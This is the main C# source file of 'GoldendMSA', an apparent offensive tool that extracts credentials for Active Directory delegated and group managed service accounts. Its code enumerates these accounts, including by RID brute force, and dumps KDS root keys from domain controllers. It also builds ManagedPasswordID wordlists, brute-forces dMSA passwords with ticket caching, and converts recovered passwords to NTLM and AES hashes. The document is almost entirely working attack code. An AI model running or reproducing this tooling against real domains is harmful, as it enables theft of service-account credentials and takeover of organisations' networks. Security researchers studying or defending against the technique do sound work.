using System;
using CommandLine;
using System.IO;
using System.Linq;
using System.Security.Principal;
using System.Text.RegularExpressions;
using CommandLine.Text;

namespace GoldendMSA
{
    public class Program
    {
        static void Main(string[] args)
        {
            PrintStyle();
            var parser = new Parser();

            var parserResult = parser.ParseArguments<InfoOptions, WordlistOptions, KdsOptions, ComputeOptions, BruteForceOptions, ConvertOptions, UsageOptions>(args);

            parserResult
                .WithParsed<InfoOptions>(options => ProcessInfoOptions(options))
                .WithParsed<WordlistOptions>(options => ProcessWordOptions(options))
                .WithParsed<KdsOptions>(options => ProcessKDSOptions(options))
                .WithParsed<ComputeOptions>(options => ProcessComputeOptions(options))
                .WithParsed<BruteForceOptions>(options => ProcessBruteforceOptions(options))
                .WithParsed<ConvertOptions>(options => ProcessConvertOptions(options))
                .WithParsed<UsageOptions>(options => ProcessUsageOptions(options))
                .WithNotParsed(errors =>
                {
                    var helpText = HelpText.AutoBuild(parserResult, h =>
                    {
                        h.AdditionalNewLineAfterOption = false;
                        var helpTxt = HelpText.DefaultParsingErrorsHandler(parserResult, h);
                        return helpTxt;
                    }, e =>
                    {
                        return e;
                    });
                    Console.Error.Write(helpText);
                });
        }
        public static void PrintStyle()
        {
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine(@"
  ____        _     _             ____  __  __ ____    _    
 / ___|  ___ | | __| | ___ _ __  |  _ \|  \/  / ___|  / \   
| |  _  / _ \| |/ _` |/ _ \ '_ \ | | | | |\/| \___ \ / _ \  
| |_| || (_) | | (_| |  __/ | | || |_| | |  | |___) / ___ \ 
 \____| \___/|_|\__,_|\___|_| |_||____/|_|  |_|____/_/   \_\
                                                           ");

            Console.ForegroundColor = ConsoleColor.DarkYellow;
            Console.WriteLine("═══════════════════════════════════════════════════════════════");

            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine(" Delegated + Group Managed Service Account creds extractor");

            Console.ForegroundColor = ConsoleColor.DarkYellow;
            Console.WriteLine("═══════════════════════════════════════════════════════════════");

            Console.ResetColor();
        }
        public static void ProcessUsageOptions(UsageOptions options)
        {
            Console.WriteLine("Examples:");
            Console.WriteLine("");
            Console.WriteLine("compute:");
            Console.WriteLine("\tGoldendMSA.exe compute  -s <sid> -k <KDS Root key> -d <domain name> -m <ManadgedPasswordID>");
            Console.WriteLine("");
            Console.WriteLine("convert:");
            Console.WriteLine("\tGoldendMSA.exe convert -d <domain name> -u <username end with $> -p <base64 password>"); 
            Console.WriteLine("");
            Console.WriteLine("wordlist:");
            Console.WriteLine("\tGoldendMSA.exe wordlist -s <dMSA's sid> -d <dMSA's domain> -f <forest's domain> -k <id of kds root key>");
            Console.WriteLine("");
            Console.WriteLine("info:");
            Console.WriteLine("\tGoldendMSA.exe info -d <domain name> -m ldap");
            Console.WriteLine("\tGoldendMSA.exe info -d <domain name> -m brute -u <username> -p <password> -o <user's domain name> -s <gMSA's sid> ");
            Console.WriteLine("\tGoldendMSA.exe info -d <domain name> -m brute -u <username> -p <password> -o <user's domain name> -r <number> ");
            Console.WriteLine("");
            Console.WriteLine("kds:");
            Console.WriteLine("\tGoldendMSA.exe kds");
            Console.WriteLine("\tGoldendMSA.exe kds --domain <domain name>");
            Console.WriteLine("\tGoldendMSA.exe kds -g <guid of KDS root key>");
            Console.WriteLine("");
            Console.WriteLine("bruteforce:");
            Console.WriteLine("\tGoldendMSA.exe bruteforce -s <sid of dmsa> -k <kds root key> -d <dmsa's domain> -u <dmsa (should end with $)> -t");
            Console.WriteLine("\tGoldendMSA.exe bruteforce -s <sid of dmsa> -k <kds root key> -d <dmsa's domain> -u <dmsa (should end with $)> -v");
        }
        public static void ProcessComputeOptions(ComputeOptions options)
        {
            SecurityIdentifier sid = null;
            string DomainName = null;
            string ForestName = null;
            string Base64KDS = options.KdsRootKeyBase64;
            string Base64ManagePasswordID = options.ManagedPwdIdBase64;
            if (!Helpers.IsBase64String(options.KdsRootKeyBase64))
            {
                Console.WriteLine("[X] Golden DMSA - KDS is not valid");
                Console.WriteLine("Execution example: GoldendMSA.exe compute  -s <sid> -k <KDS Root key> -d <domain name> -m <ManadgedPasswordID>");
                return;
            }
            if (!Helpers.IsBase64String(options.ManagedPwdIdBase64))
            {
                Console.WriteLine("[X] Golden DMSA - ManagePasswordID is not valid");
                Console.WriteLine("Execution example: GoldendMSA.exe compute  -s <sid> -k <KDS Root key> -d <domain name> -m <ManadgedPasswordID>");
                return;
            }
            
            if (!(Helpers.IsValidDomainFormatRegex(options.DomainName)))
            {
                Console.WriteLine("[X] Golden DMSA - Did not granted a valid domain name");
                Console.WriteLine("Execution example: GoldendMSA.exe compute  -s <sid> -k <KDS Root key> -d <domain name> -m <ManadgedPasswordID>");
                return;
            }
            string sidPattern = @"^S-\d-\d+-(\d+-){1,14}\d+$";
            bool isValidFormat = Regex.IsMatch(options.Sid, sidPattern);

            if (!isValidFormat)
            {
                Console.WriteLine("[X] Golden DMSA - Did not granted a valid SID");
                Console.WriteLine("Execution example: GoldendMSA.exe compute  -s <sid> -k <KDS Root key> -d <domain name> -m <ManadgedPasswordID>");
                return;
            }
            sid = new SecurityIdentifier(options.Sid);
            
            ProcessComputePwdOptions(sid, Base64KDS, Base64ManagePasswordID, DomainName, ForestName);
        }
        public static void ProcessConvertOptions(ConvertOptions options)
        {
            if (!Helpers.IsBase64String(options.password))
            {
                Console.WriteLine("[X] Golden DMSA - Password is not valid base64 string");
                Console.WriteLine("Execution example: GoldendMSA.exe convert -d <domain name> -u <username end with $> -p <base64 password>");
                return;
            }

            if (!(Helpers.IsValidDomainFormatRegex(options.DomainName)))
            {
                Console.WriteLine("[X] Golden DMSA - Did not granted a valid user's domain name");
                Console.WriteLine("Execution example: GoldendMSA.exe convert -d <domain name> -u <username end with $> -p <base64 password>");
                return;
            }
            if (!String.IsNullOrEmpty(options.username) && (options.username).EndsWith("$")) {
                Console.WriteLine("");
                Console.WriteLine(options.DomainName + "\\" + options.username);
                string ntlmHash = Helpers.ConvertBase64ToNTLM(options.password);
                Console.WriteLine($"NTLM Hash: {ntlmHash}");
                Helpers.base64ToAES(options.username, options.DomainName, options.password, false);
                return;
            }
            Console.WriteLine("[X] Golden DMSA - Faced some issues while converting the data.");
            Console.WriteLine("Execution example: GoldendMSA.exe convert -d <domain name> -u <username end with $> -p <base64 password>");
        }
        public static void ProcessWordOptions(WordlistOptions option)
        {   
            string sidPattern = @"^S-\d-\d+-(\d+-){1,14}\d+$";
            
            if (String.IsNullOrEmpty(option.Sid)) { 
                Console.WriteLine("[X] Golden DMSA - Did not granted a valid SID");
                Console.WriteLine("Execution example: GoldendMSA.exe wordlist -s <dMSA's sid> -d <dMSA's domain> -f <forest's domain> -k <id of kds root key>");
                return; 
            }
            bool isValidFormat = Regex.IsMatch(option.Sid, sidPattern);
            if (!isValidFormat)
            {
                Console.WriteLine("[X] Golden DMSA - Did not granted a valid SID");
                Console.WriteLine("Execution example: GoldendMSA.exe wordlist -s <dMSA's sid> -d <dMSA's domain> -f <forest's domain> -k <id of kds root key>");
                return;
            }

            if (!(Helpers.IsValidDomainFormatRegex(option.forestName)))
            {
                Console.WriteLine("[X] Golden DMSA - Did not granted a valid forest name");
                Console.WriteLine("Execution example: GoldendMSA.exe wordlist -s <dMSA's sid> -d <dMSA's domain> -f <forest's domain> -k <id of kds root key>");
                return;
            }

            if (!(Helpers.IsValidDomainFormatRegex(option.DomainName)))
            {
                Console.WriteLine("[X] Golden DMSA - Did not granted a valid domain name");
                Console.WriteLine("Execution example: GoldendMSA.exe wordlist -s <dMSA's sid> -d <dMSA's domain> -f <forest's domain> -k <id of kds root key>");
                return;
            }
            GenerateMSDS_ManagedPasswordID(option.DomainName, option.forestName, option.keyID, option.Sid);
        }
        public static void ProcessInfoOptions(InfoOptions option)
        {
            if (option.method.Equals("brute") && !String.IsNullOrEmpty(option.user) && !String.IsNullOrEmpty(option.DomainOfUser) && !String.IsNullOrEmpty(option.password))
            {
                string sidPattern = @"^S-\d-\d+-(\d+-){1,14}\d+$";

                SecurityIdentifier sid = null;
                if (!String.IsNullOrEmpty(option.Sid))
                {
                    bool isValidFormat = Regex.IsMatch(option.Sid, sidPattern);
                    if (isValidFormat)
                    {
                        sid = new SecurityIdentifier(option.Sid);
                    }
                }

                if (!(Helpers.IsValidDomainFormatRegex(option.DomainOfUser)))
                {
                    Console.WriteLine("[X] Golden DMSA - Did not granted a valid user's domain name");
                    Console.WriteLine("Execution example: GoldendMSA.exe info -d <domain name> -m brute -u <username> -p <password> -o <user's domain name> -r <number> ");
                    return;
                }
                if (!(Helpers.IsValidDomainFormatRegex(option.DomainName)))
                {
                    Console.WriteLine("[X] Golden DMSA - Did not granted a valid domain name");
                    Console.WriteLine("Execution example: GoldendMSA.exe info -d <domain name> -m brute -u <username> -p <password> -o <user's domain name> -r <number> ");
                    return;
                }
                Console.WriteLine("GMSAs:");
                Console.WriteLine("");
                ProcessGmsaInfoOptions(sid, option.DomainName);
                Console.WriteLine("DMSAs:");
                Console.WriteLine("");
                int maxRid = option.maxRID;
                if (maxRid == 0)
                {
                    maxRid = 2000;
                }
                ProcessDmsaInfoOptions(option.DomainName, option.user, option.password, option.DomainOfUser, maxRid);
            }
            else if (option.method.Equals("ldap"))
            {
                Console.WriteLine("GMSAs:");
                Console.WriteLine("");
                string sidPattern = @"^S-\d-\d+-(\d+-){1,14}\d+$";

                SecurityIdentifier sid = null;
                if (!String.IsNullOrEmpty(option.Sid))
                {
                    bool isValidFormat = Regex.IsMatch(option.Sid, sidPattern);
                    if (isValidFormat)
                    {
                        sid = new SecurityIdentifier(option.Sid);
                    }
                }
                ProcessGmsaInfoOptions(sid, option.DomainName);
                Console.WriteLine("DMSAs:");
                LdapEnumeration.ldapEnumeration(option.DomainName);
            }
            else
            {
                
                Console.WriteLine("[X] Golden DMSA - This is not a valid command");
                Console.WriteLine("Execution example: GoldendMSA.exe info -d <domain name> -m ldap");
                Console.WriteLine("Execution example: GoldendMSA.exe info -d <domain name> -m brute -u <username> -p <password> -o <user's domain name> -r <number> ");
                return;
                
            }
        }
        public static void ProcessKDSOptions(KdsOptions options)
        {
            
            Guid? guidName = null;

            if (String.IsNullOrEmpty(options.DomainName))
            {
                Console.WriteLine("Dumping from forest'S DC. Must be running as Enterprise admin.");
                Console.WriteLine("");
            }
            else 
            {
                if (!(Helpers.IsValidDomainFormatRegex(options.DomainName)))
                {
                    Console.WriteLine("[X] Golden DMSA - Did not granted a valid domain name");
                    Console.WriteLine("Execution example: GoldendMSA.exe kds --domain <domain name>");
                    return;
                }

                Console.WriteLine("Dumping from " + options.DomainName + "'s DC. Must be running as system on this DC.");
                Console.WriteLine("");
                if (!Helpers.IsSystem())
                {
                    Console.WriteLine("[X] Golden DMSA - SYSTEM was not used for execution.");
                    return;
                }
                
            }
            
            if (!String.IsNullOrEmpty(options.guid))
            {
                if (!Helpers.IsValidGuid(options.guid))
                {
                    Console.WriteLine("[X] Golden DMSA - Did not granted a valid GUID");
                    Console.WriteLine("Execution example: GoldendMSA.exe kds -g <guid of KDS root key>");
                    return;
                }
                guidName = Guid.Parse(options.guid);
            }
            
            ProcessKdsInfoOptions(guidName, options.DomainName);
        }
        public static void ProcessBruteforceOptions(BruteForceOptions options)
        {
            SecurityIdentifier sid = null; 
            string Base64KDS = options.KdsRootKeyBase64;
            string DomainName = options.DomainName;
            string kdsID = options.fileName;  
            string username = null;

            if (!Helpers.IsBase64String(options.KdsRootKeyBase64))
            {
                Console.WriteLine("[X] Golden DMSA - KDS is not valid");
                Console.WriteLine("Execution example: GoldendMSA.exe bruteforce -s <sid of dmsa> -k <kds root key> -d <dmsa's domain> -u <dmsa (should end with $)> -t");
                return;
            }
            if (!File.Exists(options.fileName + ".txt"))
            {
                Console.WriteLine("[X] Golden DMSA - File is not exist for this kds ");
                Console.WriteLine("Execution example: GoldendMSA.exe bruteforce -s <sid of dmsa> -k <kds root key> -d <dmsa's domain> -u <dmsa (should end with $)> -t");
                return;
            }
            kdsID = options.fileName + ".txt";
            if (!((options.username).EndsWith("$")))
            {

                Console.WriteLine("[X] Golden DMSA - Did not granted a valid username");
                Console.WriteLine("Execution example: GoldendMSA.exe bruteforce -s <sid of dmsa> -k <kds root key> -d <dmsa's domain> -u <dmsa (should end with $)> -t");
                return;
            }
            else
            {
                username = (options.username).ToLower();
            }
            
            if (!(Helpers.IsValidDomainFormatRegex(options.DomainName)))
            {
                Console.WriteLine("[X] Golden DMSA - Did not granted a valid domain name");
                Console.WriteLine("Execution example: GoldendMSA.exe bruteforce -s <sid of dmsa> -k <kds root key> -d <dmsa's domain> -u <dmsa (should end with $)> -t");
                return;
            }
            DomainName = options.DomainName;
            
            string sidPattern = @"^S-\d-\d+-(\d+-){1,14}\d+$";
            bool isValidFormat = Regex.IsMatch(options.Sid, sidPattern);

            if (!isValidFormat)
            {
                Console.WriteLine("[X] Golden DMSA - Did not granted a valid SID");
                Console.WriteLine("Execution example: GoldendMSA.exe bruteforce -s <sid of dmsa> -k <kds root key> -d <dmsa's domain> -u <dmsa (should end with $)> -t");
                return;
            }
            sid = new SecurityIdentifier(options.Sid);
                        
            BruteForceDMSA.BruteForce(sid, Base64KDS, kdsID, username, DomainName,options.ptt, options.verbose);
        }
        /*
         * Description - Generates files with all the wordlists per KDS Root key.
         */
        static void GenerateMSDS_ManagedPasswordID(string domain, string forest, String RKL, string sid)
        {
            Guid gd;
            byte dsize = (byte)(domain.Length * 2 + 2);
            byte fsize = (byte)(forest.Length * 2 + 2);
            byte[] guidBytesCopy = new byte[52 + dsize + fsize];
            guidBytesCopy[4] = 75;
            guidBytesCopy[5] = 68;
            guidBytesCopy[6] = 83;
            guidBytesCopy[7] = 75;
            guidBytesCopy[8] = 2;
            guidBytesCopy[12] = 2;
            try
            {
                gd = new Guid(RKL);
            }
            catch
            {
                Console.WriteLine("[X] Golden DMSA - Failed to convert " + RKL + " into a valid guid. Use format like this - f06c3c8d-b2c2-4cc6-9a1a-8b3b3c82b9f0");
                return;
            }
            byte[] guidBytes = gd.ToByteArray();
            Array.Copy(guidBytes, 0, guidBytesCopy, 24, 16);
            guidBytesCopy[0] = 1;
            Console.WriteLine("");
            Console.WriteLine("[V] Golden DMSA - Created file - " + RKL + ".txt for the key id " + RKL);
            Console.WriteLine("");
            for (byte l1 = 0; l1 <= 31; l1++)
            {
                // Create a copy of the base array
                byte[] newArray = (byte[])guidBytesCopy.Clone();

                // Set L1 value (at index 16)
                newArray[16] = l1;
                for (byte l2 = 0; l2 <= 31; l2++)
                {
                    newArray[20] = l2;
                    newArray[44] = dsize;
                    newArray[48] = fsize;
                    int index = 52;
                    foreach (char c in domain)
                    {
                        newArray[index] = (byte)System.Convert.ToInt32(c);
                        index = index + 2;
                    }
                    index = 52 + dsize;
                    foreach (char c in forest)
                    {
                        newArray[index] = (byte)System.Convert.ToInt32(c);
                        index = index + 2;
                    }
                    string base64 = Convert.ToBase64String(newArray);
                    using (StreamWriter writer = new StreamWriter(RKL + ".txt", true))
                    {
                        writer.WriteLine(base64);
                    }

                }

            }
        }

        static void ProcessGmsaInfoOptions(SecurityIdentifier Sid, String DomainName)
        {
            try
            {
                string domainName = null;

                if (string.IsNullOrEmpty(DomainName))
                {
                    domainName = System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain().Name;
                }
                else
                {
                    domainName = DomainName;
                }
                if (Sid != null)
                {
                    var gmsa = GmsaAccount.GetGmsaAccountBySid(domainName, Sid);

                    if (gmsa != null)
                    {
                        Console.WriteLine(gmsa.ToString());
                    }
                    else
                    {
                        Console.WriteLine($"GMSA with SID {Sid} not found in domain {domainName}");
                    }
                }
                else
                {
                    var gmsaAccounts = GmsaAccount.FindAllGmsaAccountsInDomain(domainName);
                    if (gmsaAccounts.Count() > 0)
                    {
                        foreach (var gmsa in gmsaAccounts)
                        {
                            Console.WriteLine(gmsa.ToString());
                        }
                    }
                    else
                    {
                        Console.WriteLine("No GMSAs were found");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"ERROR: {ex.Message}");
            }
        }

        static void ProcessDmsaInfoOptions(String DomainName, string user, string password, string userDomain, int maxRid = 1500)
        {
            dMSAEnumerate.PrintDMSAs(DomainName, user, password, userDomain,maxRid);
        }

        static void ProcessKdsInfoOptions(Guid? KdsKeyGuid, String domainName)
        {
            try
            {
                string forestName = null;

                if (string.IsNullOrEmpty(domainName))
                {
                    forestName = System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain().Forest.Name;
                }
                else
                {

                    forestName = domainName;
                    bool isSystem = Helpers.IsCurrentUserSystem();
                    if (!isSystem)
                    {
                        Console.WriteLine("[X] Golden DMSA - Seems like you are not using System user.");
                        return;
                    }
                }

                if (KdsKeyGuid.HasValue)
                {
                    var rootKey = RootKey.GetRootKeyByGuid(forestName, KdsKeyGuid.Value);

                    if (rootKey == null)
                        Console.WriteLine($"KDS Root Key with ID {KdsKeyGuid.Value} not found");
                    else
                        Console.WriteLine(rootKey.ToString());
                }
                else
                {
                    var rootKeys = RootKey.GetAllRootKeys(forestName);
                    if (rootKeys.Count() > 0)
                    {
                        foreach (var rootKey in rootKeys)
                        {
                            Console.WriteLine(rootKey.ToString());
                        }
                    }
                    else
                    {
                        Console.WriteLine("[X] Golden DMSA - Did not obtain any KDS root keys - Make sure to run is from an enterprise admin or consider to run this tool as SYSTEM user on one of the domain's DCs in the forest (attach domain's name to the commandline arguments).");
                        return;
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"ERROR: {ex.Message}");
            }
        }

        public static string ProcessComputePwdOptions(SecurityIdentifier Sid, string KdsRootKeyBase64, string ManagedPwdIdBase64, string DomainName, string ForestName, bool print=true)
        {
            try
            {
                string domainName = "", forestName = "";

                if (Sid == null)
                    throw new ArgumentNullException(nameof(Sid));

                // If we will run online mode
                if (string.IsNullOrEmpty(KdsRootKeyBase64) || string.IsNullOrEmpty(ManagedPwdIdBase64))
                {
                    // If we need to automatically get forest name
                    if (string.IsNullOrEmpty(ForestName))
                    {
                        forestName = System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain().Forest.Name;
                    }
                    else
                    {
                        forestName = ForestName;
                    }

                    // If we need to automatically get domain name
                    if (string.IsNullOrEmpty(DomainName))
                    {
                        domainName = System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain().Name;
                    }
                    else
                    {
                        domainName = DomainName;
                    }
                }

                MsdsManagedPasswordId pwdId = null;
                RootKey rootKey = null;

                if (string.IsNullOrEmpty(ManagedPwdIdBase64))
                {
                    
                    pwdId = MsdsManagedPasswordId.GetManagedPasswordIDBySid(domainName, Sid);
                }
                else
                {
                    var pwdIdBytes = Convert.FromBase64String(ManagedPwdIdBase64);
                    pwdId = new MsdsManagedPasswordId(pwdIdBytes);
                }

                if (string.IsNullOrEmpty(KdsRootKeyBase64))
                {
                    rootKey = RootKey.GetRootKeyByGuid(forestName, pwdId.RootKeyIdentifier);
                }
                else
                {
                    var rootKeyBytes = Convert.FromBase64String(KdsRootKeyBase64);
                    rootKey = new RootKey(rootKeyBytes);
                }

                if (rootKey == null)
                {
                    Console.WriteLine($"Failed to locate KDS Root Key with ID {pwdId.RootKeyIdentifier}");
                    return "";
                }

                var pwdBytes = GmsaPassword.GetPassword(Sid, rootKey, pwdId, domainName, forestName);
                if (print)
                {
                    Console.WriteLine($"Base64 Encoded Password:\t{Convert.ToBase64String(pwdBytes)}");
                }
                return Convert.ToBase64String(pwdBytes);
            }
            catch (Exception ex)
            {

                Console.WriteLine($"ERROR: {ex}");
            }
            return "";
        }
    }

    [Verb("info", HelpText = "Get DMSA and GMSA accounts")]
    public class InfoOptions
    {
        [Option('u', "user", Required = false, HelpText = "The user to be used")]
        public String user { get; set; }

        [Option('s', "sid", Required = false, HelpText = "The SID of the object to be used. For GMSA accounts enumeration.")]
        public string Sid { get; set; }

        [Option('d', "domain", Required = true, HelpText = "Domain to query for the object")]
        public string DomainName { get; set; }

        [Option('p', "password", Required = false, HelpText = "password of the  user")]
        public string password { get; set; }

        [Option('r', "rid", Required = false, HelpText = "Max RID to bruteforce(default is 1500)")]
        public int maxRID { get; set; }

        [Option('o', "udomain", Required = false, HelpText = "Domain of the used user")]
        public string DomainOfUser { get; set; }
        [Option('m', "method", Required = true, HelpText = "method to use - brute or ldap")]
        public string method { get; set; }


    }

    [Verb("wordlist", HelpText = "Create wordlist of managedPasswordID")]
    public class WordlistOptions
    {
        [Option('s', "sid", Required = true, HelpText = "The SID of the object to be guessed.")]
        public string Sid { get; set; }

        [Option('d', "domain", Required = true, HelpText = "Domain to query for the object")]
        public string DomainName { get; set; }

        [Option('f', "forest", Required = true, HelpText = "forest of the object")]
        public string forestName { get; set; }

        [Option('k', "key", Required = true, HelpText = "KDS root key ID")]
        public string keyID { get; set; }
    }

    [Verb("kds", HelpText = "Get KDS root keys")]
    public class KdsOptions
    {
        [Option('g', "guid", Required = false, HelpText = "Get specific KDS root key by GUID")]
        public string guid { get; set; }

        [Option('d', "domain", Required = false, HelpText = "Domain to query for the object")]
        public string DomainName { get; set; }
    }

    [Verb("compute", HelpText = "Get base64 password based on KDS and ManagedPasswordID")]
    public class ComputeOptions
    {
        [Option('s', "sid", Required = true, HelpText = "SID of DMSA/GMSA account")]
        public string Sid { get; set; }

        [Option('k', "key", Required = true, HelpText = "KDS Root key")]
        public string KdsRootKeyBase64 { get; set; }

        [Option('m', "managedpassword", Required = true, HelpText = "ManagedPwdIdBase64 in base64")]
        public string ManagedPwdIdBase64 { get; set; }

        [Option('d', "domain", Required = true, HelpText = "Domain to query for the object (target domain)")]
        public string DomainName { get; set; }

        [Option('f', "forest", Required = false, HelpText = "forest of the object (we will ask it for the KDS root key in case we did not got one)")]
        public string forestName { get; set; }

        [Option('p', "print", Required = false, HelpText = "Output required?")]
        public string print { get; set; }
    }

    [Verb("bruteforce", HelpText = "bruteforce DMSA's hash")]
    public class BruteForceOptions
    {
        [Option('s', "sid", Required = true, HelpText = "SID of DMSA/GMSA account")]
        public string Sid { get; set; }
        
        [Option('t', "ptt", Required = false, HelpText = "In case you want to cache the ticket (default not set) ")]
        public bool ptt { get; set; }

        [Option('k', "key", Required = true, HelpText = "KDS Root key")]
        public string KdsRootKeyBase64 { get; set; }

        [Option('i', "id", Required = true, HelpText = "ID of the KDS Root Key")]
        public string fileName { get; set; }

        [Option('d', "domain", Required = true, HelpText = "Domain to query for the object")]
        public string DomainName { get; set; }

        [Option('u', "username", Required = true, HelpText = "username used")]
        public string username { get; set; }

        [Option('v', "verbose", Required = false, HelpText = "use verbose output")]
        public bool verbose { get; set; }
    }

    [Verb("convert", HelpText = "convert base64 password of service account to AES and NTLM")]
    public class ConvertOptions
    {

        [Option('d', "domain", Required = true, HelpText = "Domain to query for the object")]
        public string DomainName { get; set; }

        [Option('u', "username", Required = true, HelpText = "username used")]
        public string username { get; set; }

        [Option('p', "password", Required = true, HelpText = "password used")]
        public string password { get; set; }
    }

    [Verb("usage", HelpText = "usage examples")]
    public class UsageOptions
    {
    }


}